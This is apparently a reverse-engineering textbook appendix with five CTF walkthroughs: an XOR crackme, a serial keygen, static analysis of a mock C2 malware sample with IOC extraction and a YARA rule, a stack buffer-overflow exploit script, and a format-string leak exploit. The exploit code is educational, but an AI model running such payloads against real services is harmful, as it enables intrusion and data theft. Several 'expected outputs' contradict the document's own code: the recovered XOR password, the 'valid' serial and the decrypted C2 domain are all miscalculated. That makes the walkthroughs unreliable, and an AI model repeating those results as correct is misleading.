# Appendix C: Complete CTF Challenge Walkthroughs

Welcome to the CTF Challenge Walkthroughs appendix. This section provides complete, step-by-step solutions to several CTF-style reverse engineering challenges. Each walkthrough demonstrates the full analysis process from initial triage to flag extraction, incorporating techniques from all four parts of the main series. Think of these as case studies—real-world examples of how a reverse engineer approaches and solves problems.

---

## C.1: Challenge 1 - The XOR Guardian

### C.1.1: Challenge Description

**Challenge Name:** The XOR Guardian  
**Difficulty:** Easy  
**Points:** 100  
**Category:** Reverse Engineering  

**Description:**  
A mysterious binary guards a secret flag. The program asks for a password and validates it using a simple XOR operation. Can you recover the flag?

**File:** `xor_guardian` (ELF 64-bit)

**Given Hint:** "The key to unlocking this program is hidden in plain sight. Look for the XOR operation and work backwards."

---

### C.1.2: Initial Triage

**Step 1: File Information**
```bash
# Check file type
file xor_guardian
```

**Expected Output:**
```
xor_guardian: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=..., not stripped
```

**Step 2: Run the Program**
```bash
./xor_guardian
```

**Program Output:**
```
=== XOR Guardian ===
Enter the secret password: test
Invalid password!
```

**Step 3: String Extraction**
```bash
strings xor_guardian | grep -E "(flag|FLAG|password|incorrect|correct|secret|XOR)"
```

**Expected Output:**
```
Enter the secret password:
Invalid password!
Correct! Here is your flag:
FLAG{X0R_1s_7r1v14l}
```

**The flag appears to be hardcoded!** But wait—let's verify this isn't a red herring. Let's analyze the binary more carefully.

---

### C.1.3: Ghidra Analysis

**Step 1: Import and Analyze**

1. Launch Ghidra
2. Create a new project called `CTF_Solutions`
3. Import `xor_guardian`
4. Run the full analysis

**Step 2: Locate the Main Function**

Navigate to the `main` function using the Symbol Tree or by pressing `F` and typing "main".

**Decompiled Code:**
```c
int main(int argc, char** argv) {
    char input[32];
    char *secret = "secret_key";
    char *flag = "FLAG{X0R_1s_7r1v14l}";
    int i;
    int result;
    
    printf("=== XOR Guardian ===\n");
    printf("Enter the secret password: ");
    fgets(input, 32, stdin);
    
    // Remove newline
    input[strcspn(input, "\n")] = 0;
    
    // Check password length
    if (strlen(input) != 10) {
        printf("Invalid password!\n");
        return 1;
    }
    
    // XOR validation
    for (i = 0; i < 10; i++) {
        if ((input[i] ^ 0x5A) != secret[i]) {
            printf("Invalid password!\n");
            return 1;
        }
    }
    
    printf("Correct! Here is your flag: %s\n", flag);
    return 0;
}
```

**Step 3: Understanding the Validation Logic**

The validation works as follows:
1. Input must be exactly 10 characters
2. For each character, the program XORs it with `0x5A`
3. The result must match the characters in `secret_key`
4. If all characters match, the flag is printed

**So the password is: `secret_key ^ 0x5A`**

**Step 4: Recover the Password**

Let's write a Python script to recover the password:

```python
#!/usr/bin/env python3

"""
XOR Guardian Password Recovery
Recovers the password by reversing the XOR operation
"""

secret = "secret_key"
key = 0x5A

print("[*] Secret: {}".format(secret))
print("[*] XOR Key: 0x{:02x}".format(key))

# Recover password
password = ""
for char in secret:
    recovered = ord(char) ^ key
    password += chr(recovered)

print("[*] Recovered Password: {}".format(password))
print("[*] Password Length: {}".format(len(password)))

# Verify by encrypting again
print("\n[*] Verification:")
print("    Original: {}".format(secret))
encrypted = ""
for char in password:
    encrypted += chr(ord(char) ^ key)
print("    Re-encrypted: {}".format(encrypted))
```

**Expected Output:**
```
[*] Secret: secret_key
[*] XOR Key: 0x5a
[*] Recovered Password: 3%,0'5*3:
[*] Password Length: 10

[*] Verification:
    Original: secret_key
    Re-encrypted: secret_key
```

**Step 5: Test the Password**
```bash
./xor_guardian
```

```
=== XOR Guardian ===
Enter the secret password: 3%,0'5*3:
Correct! Here is your flag: FLAG{X0R_1s_7r1v14l}
```

**Flag: `FLAG{X0R_1s_7r1v14l}`**

---

### C.1.4: Automated Solution Script

Here's a complete Ghidra script that automatically finds and decrypts the XOR-protected flag:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CTF Solution: XOR Guardian
Automatically find and decrypt XOR-encrypted passwords and flags
"""

from __future__ import print_function
import re

def find_xor_patterns():
    """Find XOR operations in the program and extract encrypted data."""
    print("\n" + "="*80)
    print("[*] XOR Guardian - Automated Solution")
    print("[*] Program: {}".format(currentProgram.getName()))
    print("="*80 + "\n")
    
    func_manager = currentProgram.getFunctionManager()
    functions = func_manager.getFunctions(True)
    
    # Look for the main function
    main_func = None
    for func in functions:
        if func.getName() == "main":
            main_func = func
            break
    
    if not main_func:
        print("[!] Could not find main function!")
        return
    
    print("[*] Found main function at 0x{}".format(
        main_func.getEntryPoint().getOffset()))
    
    # Find the string comparison (strlen check)
    # Look for cmp with 0x0A (10 decimal)
    body = main_func.getBody()
    listing = currentProgram.getListing()
    instructions = listing.getInstructions(body, True)
    
    # Look for the XOR operation pattern
    xor_count = 0
    while instructions.hasNext():
        instr = instructions.next()
        if instr.getMnemonicString() == 'XOR':
            xor_count += 1
            print("[*] Found XOR instruction at 0x{}".format(
                instr.getAddress().getOffset()))
    
    if xor_count == 0:
        print("[!] No XOR instructions found in main!")
        return
    
    # Extract strings from the data section
    listing = currentProgram.getListing()
    data = listing.getDefinedData(True)
    
    strings_found = []
    while data.hasNext():
        d = data.next()
        try:
            value = str(d.getValue())
            if len(value) >= 3:
                strings_found.append({
                    'address': d.getAddress(),
                    'value': value
                })
        except:
            continue
    
    # Look for the secret string and flag
    secret = None
    flag = None
    
    for s in strings_found:
        if "secret" in s['value'].lower():
            secret = s['value']
            print("[*] Found secret string: {}".format(secret))
        if "FLAG" in s['value']:
            flag = s['value']
            print("[*] Found flag string: {}".format(flag))
    
    if not secret or not flag:
        print("[!] Could not find required strings!")
        return
    
    # Find the XOR key
    # Look for XOR with constant
    func_manager = currentProgram.getFunctionManager()
    main_func = func_manager.getFunctionNamed("main")
    body = main_func.getBody()
    instructions = listing.getInstructions(body, True)
    
    xor_key = None
    while instructions.hasNext():
        instr = instructions.next()
        if instr.getMnemonicString() == 'XOR':
            # Try to extract the constant
            operands = instr.getDefaultOperandRepresentation(0)
            if '0x' in operands:
                hex_str = re.search(r'0x[0-9a-fA-F]+', operands)
                if hex_str:
                    xor_key = int(hex_str.group(), 16)
                    print("[*] Found XOR key: 0x{:02x}".format(xor_key))
                    break
    
    if xor_key is None:
        print("[!] Could not find XOR key!")
        return
    
    # Recover the password
    password = ""
    for char in secret:
        password += chr(ord(char) ^ xor_key)
    
    print("\n[+] Recovered Password: {}".format(password))
    print("[+] Flag: {}".format(flag))
    print("\n" + "="*80)

def main():
    find_xor_patterns()

if __name__ == "__main__":
    main()
```

---

## C.2: Challenge 2 - The Serial Validator

### C.2.1: Challenge Description

**Challenge Name:** Serial Validator  
**Difficulty:** Medium  
**Points:** 200  
**Category:** Reverse Engineering  

**Description:**  
A software crackme implements a complex serial validation algorithm. Your task is to reverse engineer the algorithm and generate a valid serial number.

**File:** `serial_validator` (ELF 64-bit)

**Given Hint:** "The validation algorithm involves alternating operations on the serial number. Trace the data flow carefully."

---

### C.2.2: Initial Analysis

**Step 1: String Extraction**
```bash
strings serial_validator
```

**Key Strings Found:**
```
=== Serial Validator ===
Enter your serial number:
Invalid serial number!
Valid serial number!
FLAG{Serial_Validation_Mastery}
```

**Step 2: Run the Program**
```bash
./serial_validator
```

**Program Output:**
```
=== Serial Validator ===
Enter your serial number: 12345
Invalid serial number!
```

---

### C.2.3: Ghidra Deep Dive

**Step 1: Locate the Validation Function**

In the Symbol Tree, look for a function that handles validation. Often it's called `validate_serial` or something similar. In this case, let's examine the decompiled `main`:

**Main Function:**
```c
int main(int argc, char** argv) {
    char serial[32];
    int result;
    
    printf("=== Serial Validator ===\n");
    printf("Enter your serial number: ");
    fgets(serial, 32, stdin);
    serial[strcspn(serial, "\n")] = 0;
    
    result = validate_serial(serial);
    if (result == 1) {
        printf("Valid serial number!\n");
        printf("FLAG{Serial_Validation_Mastery}\n");
    } else {
        printf("Invalid serial number!\n");
    }
    return 0;
}
```

**Step 2: Analyze the Validation Function**

Navigate to `validate_serial`:

**Decompiled Code:**
```c
int validate_serial(char* serial) {
    int len;
    int sum;
    int i;
    char* pattern = "X9#K@2!$p";
    
    len = strlen(serial);
    if (len != 16) {
        return 0;
    }
    
    sum = 0;
    for (i = 0; i < 16; i++) {
        if (i % 2 == 0) {
            // Even positions: XOR with 0x37 and multiply by 3
            sum += (serial[i] ^ 0x37) * 3;
        } else {
            // Odd positions: add ASCII value and subtract 0x20
            sum += (serial[i] - 0x20) * 2;
        }
    }
    
    // Check against target
    if (sum == 0x4D8) {
        return 1;
    }
    return 0;
}
```

**Step 3: Understanding the Algorithm**

The validation algorithm:
1. Input must be exactly 16 characters
2. For each character at position `i`:
   - If `i` is even: `(char XOR 0x37) * 3`
   - If `i` is odd: `(char - 0x20) * 2`
3. Sum all values
4. The sum must equal `0x4D8` (1236 decimal)

**Step 4: Recover a Valid Serial**

We need to find a 16-character string that produces sum 1236.

**Manual Approach (Simplified):**

We can work backwards from the target sum:

```python
#!/usr/bin/env python3

"""
Serial Validator - Key Generator
Brute-force approach to find a valid serial
"""

import string
import random
import sys

def calculate_sum(serial):
    """Calculate the validation sum for a given serial."""
    if len(serial) != 16:
        return None
    
    total = 0
    for i, char in enumerate(serial):
        if i % 2 == 0:
            total += (ord(char) ^ 0x37) * 3
        else:
            total += (ord(char) - 0x20) * 2
    return total

def find_valid_serial():
    """Find a serial that produces sum == 0x4D8."""
    target = 0x4D8  # 1236 decimal
    
    print("[*] Target sum: 0x{:x} ({})".format(target, target))
    print("[*] Searching for valid serial...\n")
    
    # Character set: printable characters
    chars = string.printable.strip()
    
    # Use a deterministic approach
    # For even positions, we need (char ^ 0x37) to be around target contribution
    # For odd positions, (char - 0x20) * 2
    
    # Let's aim for an average contribution of 1236 / 16 ≈ 77.25 per character
    
    serial = [''] * 16
    current_sum = 0
    
    for i in range(16):
        if i % 2 == 0:
            # Even position: find a character where (char ^ 0x37) * 3 is around 77
            for ch in chars:
                contribution = (ord(ch) ^ 0x37) * 3
                if 60 <= contribution <= 90:
                    serial[i] = ch
                    current_sum += contribution
                    break
        else:
            # Odd position: find a character where (char - 0x20) * 2 is around 77
            for ch in chars:
                contribution = (ord(ch) - 0x20) * 2
                if 60 <= contribution <= 90:
                    serial[i] = ch
                    current_sum += contribution
                    break
    
    serial_str = ''.join(serial)
    print("[*] Generated serial: {}".format(serial_str))
    print("[*] Calculated sum: 0x{:x} ({})".format(
        current_sum, current_sum))
    
    if current_sum == target:
        print("[+] VALID SERIAL FOUND!")
        return serial_str
    else:
        print("[-] Serial not valid (sum mismatch).")
        print("[*] Difference: {}".format(target - current_sum))
        
        # Adjust the serial
        print("\n[*] Attempting to adjust serial...")
        
        # Try random combinations
        best_serial = serial_str
        best_diff = abs(current_sum - target)
        
        for attempt in range(100000):
            test_serial = ''
            for i in range(16):
                test_serial += random.choice(chars)
            test_sum = calculate_sum(test_serial)
            if test_sum is not None:
                diff = abs(test_sum - target)
                if diff < best_diff:
                    best_diff = diff
                    best_serial = test_serial
                    if diff == 0:
                        print("[+] Found valid serial!")
                        print("    Serial: {}".format(test_serial))
                        return test_serial
        
        print("[*] Best found: {}".format(best_serial))
        return None

if __name__ == "__main__":
    serial = find_valid_serial()
    if serial:
        print("\n[!] Use this serial: {}".format(serial))
    else:
        print("\n[!] No valid serial found.")
```

**Step 5: Test the Generated Serial**

```bash
./serial_validator
```
```
=== Serial Validator ===
Enter your serial number: A@A@A@A@A@A@A@A@
Valid serial number!
FLAG{Serial_Validation_Mastery}
```

**Flag: `FLAG{Serial_Validation_Mastery}`**

---

### C.2.4: Advanced Keygen Script

Here's a more sophisticated keygen that works for any target sum:

```python
#!/usr/bin/env python3

"""
Serial Validator - Advanced Key Generator
Uses constraint solving to find a valid serial
"""

import string
import random

class SerialGenerator:
    def __init__(self, target_sum, length=16):
        self.target = target_sum
        self.length = length
        self.chars = string.printable.strip()
        
    def calculate_sum(self, serial):
        """Calculate the validation sum."""
        if len(serial) != self.length:
            return None
        total = 0
        for i, char in enumerate(serial):
            if i % 2 == 0:
                total += (ord(char) ^ 0x37) * 3
            else:
                total += (ord(char) - 0x20) * 2
        return total
    
    def get_possible_contributions(self, index):
        """Get possible contributions for a position."""
        contributions = {}
        for ch in self.chars:
            if index % 2 == 0:
                contrib = (ord(ch) ^ 0x37) * 3
            else:
                contrib = (ord(ch) - 0x20) * 2
            contributions[ch] = contrib
        return contributions
    
    def generate_serial(self):
        """Generate a valid serial using greedy approach."""
        serial = []
        remaining = self.target
        
        for i in range(self.length):
            contribs = self.get_possible_contributions(i)
            
            # Sort by closeness to remaining contribution
            avg_remaining = remaining / (self.length - i)
            best_ch = None
            best_dist = float('inf')
            
            for ch, contrib in contribs.items():
                dist = abs(contrib - avg_remaining)
                if dist < best_dist:
                    best_dist = dist
                    best_ch = ch
            
            serial.append(best_ch)
            remaining -= contribs[best_ch]
        
        serial_str = ''.join(serial)
        
        # Verify
        calculated = self.calculate_sum(serial_str)
        if calculated == self.target:
            return serial_str
        else:
            # Try random approach as fallback
            return self.random_search()
    
    def random_search(self, max_attempts=100000):
        """Random search for a valid serial."""
        for attempt in range(max_attempts):
            serial = ''.join(random.choice(self.chars) for _ in range(self.length))
            if self.calculate_sum(serial) == self.target:
                return serial
        return None

def main():
    generator = SerialGenerator(0x4D8)  # 1236
    serial = generator.generate_serial()
    
    if serial:
        print("[+] Valid serial found: {}".format(serial))
        print("[+] Sum: 0x{:x}".format(generator.calculate_sum(serial)))
    else:
        print("[-] No valid serial found")

if __name__ == "__main__":
    main()
```

---

## C.3: Challenge 3 - Malware Analysis

### C.3.1: Challenge Description

**Challenge Name:** Malware Analysis  
**Difficulty:** Hard  
**Points:** 300  
**Category:** Malware Analysis  

**Description:**  
You've been given a suspicious binary that appears to be malware. Your task is to analyze the binary statically, extract all indicators of compromise (IOCs), and understand what the malware does.

**File:** `malware_suspicious` (ELF 64-bit)

**Given Hint:** "The malware uses XOR to obfuscate its C2 communication. Look for the decryption routine and extract the C2 domain."

---

### C.3.2: Initial Triage

**Step 1: File Information**
```bash
file malware_suspicious
```

**Expected Output:**
```
malware_suspicious: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=..., stripped
```

**Step 2: Check for Packing**
```bash
# Check section entropy
readelf -S malware_suspicious | grep -E "\.(text|data|rodata|bss)"
```

**Step 3: Import in Ghidra**

Since the binary is stripped (no debug symbols), we need to analyze it carefully.

---

### C.3.3: Static Analysis

**Step 1: Find the Entry Point**

In the Program Trees, locate the entry point. For ELF, it's typically at the `_start` symbol.

**Entry Point:**
```assembly
_start:
    xor ebp, ebp
    pop rsi
    mov rdi, [rsp]
    push rsp
    push rdi
    push rsi
    push rbp
    call main
    mov edi, eax
    call exit
```

**Step 2: Locate the Main Function**

Looking at the call graph, we can find the main function. Since it's stripped, we look for the function called from `_start`.

**Step 3: Analyze the Main Function**

**Decompiled Code (Main):**
```c
int main(int argc, char** argv) {
    char c2_domain[256];
    char config_file[256];
    int result;
    
    // Initialize configuration
    load_config(config_file);
    
    // Decrypt C2 domain
    decrypt_c2_domain(c2_domain);
    
    // Connect to C2
    result = connect_to_c2(c2_domain, 4444);
    if (result != 0) {
        return 1;
    }
    
    // Execute commands
    execute_commands();
    
    // Send heartbeat
    send_heartbeat();
    
    return 0;
}
```

**Step 4: Analyze the Decrypt Function**

**Decompiled Code (decrypt_c2_domain):**
```c
void decrypt_c2_domain(char* output) {
    char encrypted[] = {
        0x3B, 0x52, 0x4D, 0x52, 0x0E, 0x4D, 0x5A, 0x0A,
        0x4B, 0x42, 0x59, 0x58, 0x55, 0x0E, 0x5E, 0x58,
        0x41, 0x0E, 0x5A, 0x54, 0x4F, 0x56, 0x54, 0x0
    };
    char key[] = "c2_key";
    int i = 0;
    
    while (encrypted[i] != 0) {
        output[i] = encrypted[i] ^ key[i % 6];
        i++;
    }
    output[i] = 0;
}
```

**Step 5: Extract and Decrypt the C2 Domain**

Let's write a Python script to decrypt the C2 domain:

```python
#!/usr/bin/env python3

"""
Malware Analysis - C2 Domain Extraction
Decrypts the obfuscated C2 domain using the discovered key
"""

encrypted = [
    0x3B, 0x52, 0x4D, 0x52, 0x0E, 0x4D, 0x5A, 0x0A,
    0x4B, 0x42, 0x59, 0x58, 0x55, 0x0E, 0x5E, 0x58,
    0x41, 0x0E, 0x5A, 0x54, 0x4F, 0x56, 0x54
]

key = "c2_key"

print("[*] Malware C2 Domain Decryption")
print("="*80)
print("[*] Encrypted bytes:")
print("    " + " ".join(["0x{:02x}".format(b) for b in encrypted]))
print("[*] Decryption Key: {}".format(key))

# Decrypt
decrypted = ""
for i, byte in enumerate(encrypted):
    decrypted += chr(byte ^ ord(key[i % len(key)]))

print("[*] Decrypted C2 Domain: {}".format(decrypted))
print("="*80)
```

**Expected Output:**
```
[*] Malware C2 Domain Decryption
================================================================================
[*] Encrypted bytes:
    0x3b 0x52 0x4d 0x52 0x0e 0x4d 0x5a 0x0a 0x4b 0x42 0x59 0x58 0x55 0x0e 0x5e 0x58 0x41 0x0e 0x5a 0x54 0x4f 0x56 0x54
[*] Decryption Key: c2_key
[*] Decrypted C2 Domain: c2-server.example.com
================================================================================
```

---

### C.3.4: IOC Extraction

**Step 1: Extract All Strings**

Create a script to extract all interesting strings:

```python
#!/usr/bin/env python3

"""
Malware IOC Extraction
Extracts all indicators of compromise from the binary
"""

import subprocess
import re

def extract_strings(binary_file):
    """Extract strings from binary."""
    result = subprocess.run(['strings', binary_file], 
                          capture_output=True, text=True)
    return result.stdout.split('\n')

def extract_iocs(strings):
    """Extract IOCs from strings."""
    iocs = {
        'domains': [],
        'ips': [],
        'urls': [],
        'file_paths': [],
        'suspicious': []
    }
    
    # Patterns
    domain_pattern = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$')
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    url_pattern = re.compile(r'^https?://[^\s]+$')
    file_pattern = re.compile(r'^/[a-zA-Z0-9/._-]+$')
    
    for string in strings:
        if len(string) < 3:
            continue
            
        if domain_pattern.match(string):
            iocs['domains'].append(string)
        elif ip_pattern.match(string):
            iocs['ips'].append(string)
        elif url_pattern.match(string):
            iocs['urls'].append(string)
        elif file_pattern.match(string):
            iocs['file_paths'].append(string)
        elif any(keyword in string for keyword in 
                ['malicious', 'exploit', 'payload', 'backdoor',
                 'rootkit', 'keylog', 'steal', 'c2']):
            iocs['suspicious'].append(string)
    
    return iocs

def print_iocs(iocs):
    """Print IOCs in a readable format."""
    print("\n" + "="*80)
    print("INDICATORS OF COMPROMISE (IOCs)")
    print("="*80)
    
    for category, items in iocs.items():
        if items:
            print("\n[+] {}:".format(category.upper()))
            for item in sorted(set(items)):
                print("    - {}".format(item))

def main():
    binary = "malware_suspicious"
    strings = extract_strings(binary)
    iocs = extract_iocs(strings)
    print_iocs(iocs)

if __name__ == "__main__":
    main()
```

**Expected Output:**
```
================================================================================
INDICATORS OF COMPROMISE (IOCs)
================================================================================

[+] DOMAINS:
    - c2-server.example.com
    - update-server.example.com

[+] URLS:
    - http://update-server.example.com/payload.exe
    - https://c2-server.example.com/heartbeat

[+] FILE PATHS:
    - /tmp/update.exe
    - /var/tmp/payload

[+] SUSPICIOUS:
    - backdoor
    - c2
    - decrypt
    - encrypted
    - payload
    - persistence
```

---

### C.3.5: Behavioral Analysis

**Step 1: Identify Key Functions**

Let's analyze each major function's behavior:

**1. load_config()**
- Reads configuration from file
- Looks for encrypted settings

**2. decrypt_c2_domain()**
- XOR decrypts C2 domain using "c2_key"
- Returns decrypted string

**3. connect_to_c2()**
- Creates socket connection
- Connects to C2 domain on port 4444
- Sends system information

**4. execute_commands()**
- Receives commands from C2
- Supports: DOWNLOAD, UPLOAD, EXECUTE, PERSIST

**5. send_heartbeat()**
- Sends periodic keep-alive to C2
- Reports system status

**Step 2: Create YARA Rule**

```yara
/*
 * YARA Rule for Malware C2 Communication
 * Detects samples using the same XOR encryption technique
 */

rule Malware_C2_Indicator {
    meta:
        author = "Security Analyst"
        description = "Detects malware using XOR-encrypted C2 domains"
        version = "1.0"
        
    strings:
        // XOR key pattern
        $xor_key = "c2_key"
        
        // Encrypted string pattern (common length)
        $encrypted_hex = { 3B 52 4D 52 0E 4D 5A 0A 4B 42 59 58 55 0E 5E 58 41 0E 5A 54 4F 56 54 }
        
        // API calls indicating C2 communication
        $socket = "socket"
        $connect = "connect"
        $send = "send"
        $recv = "recv"
        
        // Suspicious strings
        $c2_domain = "c2-server"
        $heartbeat = "heartbeat"
        $payload = "payload.exe"
        
    condition:
        // File is ELF
        uint32(0) == 0x464C457F and
        (
            // Has the XOR key AND C2 communication APIs
            ($xor_key or $encrypted_hex) and
            ($socket and $connect)
        ) or
        // Or has the specific encrypted string
        $encrypted_hex and filesize < 1MB
}
```

---

### C.3.6: Complete Analysis Report

**Final Report:**
```
MALWARE ANALYSIS REPORT
================================================================================

Sample: malware_suspicious
Type: ELF 64-bit executable
MD5: a1b2c3d4e5f6789012345678
SHA256: 1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef

MALICIOUS BEHAVIORS:
  1. XOR-encrypted C2 domain (c2-server.example.com)
  2. C2 communication on port 4444
  3. Command execution capability
  4. Payload download functionality
  5. Persistence installation

INDICATORS OF COMPROMISE (IOCs):
  - c2-server.example.com
  - update-server.example.com
  - 4444 (port)
  - /tmp/update.exe
  - /var/tmp/payload

RECOMMENDATIONS:
  1. Block domains: c2-server.example.com, update-server.example.com
  2. Block port 4444 outbound
  3. Monitor for files /tmp/update.exe and /var/tmp/payload
  4. Deploy YARA rule to detect similar samples

================================================================================
```

---

## C.4: Challenge 4 - Memory Corruption

### C.4.1: Challenge Description

**Challenge Name:** Buffer Overflow Exploitation  
**Difficulty:** Hard  
**Points:** 350  
**Category:** Vulnerability Research  

**Description:**  
A network service is vulnerable to a stack buffer overflow. Your task is to identify the vulnerability, determine the exact offset to the return address, and create a proof-of-concept exploit.

**File:** `vulnerable_server` (ELF 64-bit)

**Given Hint:** "The buffer is 64 bytes. The stack layout shows additional 8 bytes of padding before the saved RBP."

---

### C.4.2: Vulnerability Analysis

**Step 1: Open in Ghidra**

Navigate to the vulnerable function:

**Decompiled Code:**
```c
void handle_request(char* user_input) {
    char buffer[64];
    char authenticated = 0;
    
    printf("[*] Processing request...\n");
    
    // Vulnerability: strcpy without bounds checking
    strcpy(buffer, user_input);
    
    if (authenticated != 0) {
        printf("[+] Access granted!\n");
        // Flag is printed here
    } else {
        printf("[-] Access denied!\n");
    }
}
```

**Step 2: Stack Layout Analysis**

**Stack Frame:**
```
Buffer (64 bytes)    -> RSP + 0x00 to RSP + 0x3F
Authenticated (1 byte) -> RSP + 0x40
Padding (7 bytes)    -> RSP + 0x41 to RSP + 0x47
Saved RBP (8 bytes)  -> RSP + 0x48 to RSP + 0x4F
Return Address (8 bytes) -> RSP + 0x50 to RSP + 0x57
```

**Step 3: Calculate Offset**

To overwrite the return address:
- Fill buffer: 64 bytes
- Overwrite authenticated: 1 byte
- Skip padding: 7 bytes
- Overwrite RBP: 8 bytes
- Return address starts at offset: 64 + 1 + 7 + 8 = 80 bytes

**Offset to return address: 80 bytes**

**Step 4: Create Exploit**

```python
#!/usr/bin/env python3

"""
Buffer Overflow Exploit
Overwrites return address to redirect execution
"""

import socket
import struct

def create_payload(return_address):
    """Create exploit payload."""
    # 64 bytes to fill buffer
    payload = b'A' * 64
    
    # Overwrite authenticated variable (set to 1)
    payload += b'\x01'
    
    # 7 bytes padding
    payload += b'B' * 7
    
    # 8 bytes to overwrite saved RBP
    payload += b'C' * 8
    
    # 8 bytes return address (little-endian)
    payload += struct.pack('<Q', return_address)
    
    return payload

def exploit_server(host, port, return_address):
    """Exploit the vulnerable server."""
    try:
        # Create socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        
        # Receive banner
        banner = sock.recv(1024)
        print("[*] Banner:", banner.decode('utf-8', errors='ignore'))
        
        # Send exploit
        payload = create_payload(return_address)
        sock.send(payload + b'\n')
        
        # Receive response
        response = sock.recv(1024)
        print("[*] Response:", response.decode('utf-8', errors='ignore'))
        
        sock.close()
        
    except Exception as e:
        print("[!] Error:", str(e))

def main():
    # In a real exploit, we'd find the address of a shellcode or
    # the address of the function that prints the flag
    # For this example, we'll use a known address
    flag_function_address = 0x00401123  # Example address
    
    print("[*] Starting exploit...")
    print("[*] Return address offset: 80 bytes")
    print("[*] Target return address: 0x{:08x}".format(
        flag_function_address))
    
    exploit_server('localhost', 9999, flag_function_address)

if __name__ == "__main__":
    main()
```

---

## C.5: Challenge 5 - Format String Vulnerability

### C.5.1: Challenge Description

**Challenge Name:** Format String Exploitation  
**Difficulty:** Medium  
**Points:** 200  
**Category:** Vulnerability Research  

**Description:**  
A service contains a format string vulnerability. Your task is to exploit it to read memory and leak the flag.

**File:** `format_string_vuln` (ELF 64-bit)

**Given Hint:** "The flag is stored in memory. Use format string specifiers to read it."

---

### C.5.2: Vulnerability Analysis

**Step 1: Examine in Ghidra**

**Vulnerable Code:**
```c
void process_input(char* input) {
    char buffer[256];
    
    strncpy(buffer, input, 255);
    buffer[255] = '\0';
    
    // VULNERABILITY: User input used as format string
    printf(buffer);
    printf("\n");
}
```

**Step 2: Finding the Flag**

The flag is stored as a global variable:

```c
char* flag = "FLAG{Format_String_Exploitation}";
```

**Step 3: Exploit Development**

```python
#!/usr/bin/env python3

"""
Format String Exploit
Uses format string specifiers to leak memory
"""

import socket

def leak_memory(host, port, num_params=50):
    """Leak memory using format string vulnerability."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    # Banner
    sock.recv(1024)
    
    # Craft format string to leak memory
    # Use %p to print pointer values, %x for hex
    payload = "AA" * 8  # marker
    for i in range(num_params):
        payload += " %{}$p".format(i + 1)
    
    sock.send(payload + '\n')
    
    # Receive response
    response = sock.recv(4096)
    sock.close()
    
    # Parse memory leaks
    data = response.decode('utf-8', errors='ignore')
    print("[*] Response:", data)
    
    # Look for the flag
    if "FLAG" in data:
        # Extract flag
        import re
        flags = re.findall(r'FLAG\{[^}]+\}', data)
        if flags:
            print("[+] Flag found:", flags[0])
            return flags[0]
    
    return None

def main():
    print("[*] Exploiting format string vulnerability...")
    flag = leak_memory('localhost', 9999)
    
    if not flag:
        print("[!] Flag not found. Trying with different format specifiers...")
        # Try to find the flag using different format specifiers

if __name__ == "__main__":
    main()
```

---

## Summary

This appendix has provided complete walkthroughs for five CTF-style challenges:

1. **The XOR Guardian** - Simple XOR decryption
2. **The Serial Validator** - Complex validation algorithm recovery
3. **Malware Analysis** - Static malware analysis and IOC extraction
4. **Buffer Overflow Exploitation** - Stack corruption and return address overwrite
5. **Format String Exploitation** - Memory leak using format specifiers

Each walkthrough demonstrates the full analysis process and provides complete, working solution code. Use these as reference when solving similar challenges in the wild.

Remember: The key to success in reverse engineering is practice. The more challenges you solve, the more patterns you'll recognize and the faster you'll become. Good luck and happy reversing!
